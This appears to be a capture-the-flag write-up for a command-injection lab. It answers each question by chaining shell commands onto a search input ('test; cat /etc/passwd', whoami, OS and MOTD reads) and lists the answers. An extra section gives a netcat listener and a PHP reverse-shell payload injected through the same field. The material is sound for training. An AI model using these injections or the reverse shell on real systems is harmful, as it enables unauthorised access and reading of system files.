# Task 5

### What strange text file is in the website root directory? <a href="#what-strange-text-file-is-in-the-website-root-directory" id="what-strange-text-file-is-in-the-website-root-directory"></a>

```
test; ls
```

#### Answer <a href="#answer" id="answer"></a>

drpepper.txt

### How many non-root/non-service/non-daemon users are there? <a href="#how-many-non-rootnon-servicenon-daemon-users-are-there" id="how-many-non-rootnon-servicenon-daemon-users-are-there"></a>

```
test; cat /etc/passwd
```

#### Answer <a href="#answer-1" id="answer-1"></a>

0

### What user is this app running as? <a href="#what-user-is-this-app-running-as" id="what-user-is-this-app-running-as"></a>

```
test; whoami
```

#### Answer <a href="#answer-2" id="answer-2"></a>

www-data

### What is the user's shell set as? <a href="#what-is-the-users-shell-set-as" id="what-is-the-users-shell-set-as"></a>

```
test; cat /etc/passwd |grep www-data
```

#### Answer <a href="#answer-3" id="answer-3"></a>

/usr/sbin/nologin

### What version of Ubuntu is running? <a href="#what-version-of-ubuntu-is-running" id="what-version-of-ubuntu-is-running"></a>

```
test ; cat /etc/os-release

or 

test ; lsb_release -a
```

#### Answer <a href="#answer-4" id="answer-4"></a>

18.04.4

### Print out the MOTD. What favorite beverage is shown? <a href="#print-out-the-motd-what-favorite-beverage-is-shown" id="print-out-the-motd-what-favorite-beverage-is-shown"></a>

```
test ; locate 00-header
test ; cat /etc/update-motd.d/00-header 
```

#### Answer <a href="#answer-5" id="answer-5"></a>

Dr Pepper

## EXTRA <a href="#extra" id="extra"></a>

### Spawn remote shell in that machine <a href="#spawn-remote-shell-in-that-machine" id="spawn-remote-shell-in-that-machine"></a>

[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

1. On your machine

* Open a localport on your machine

```
nc -lvnp 9001
```

1. On vulnerable webpage

* Spawn this remote shell in the search input.

Replace `10.18.1.159` with your own VPN IP

```
test; php -r '$sock=fsockopen("10.18.1.159",9001);`sh <&3 >&3 2>&3`;'
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
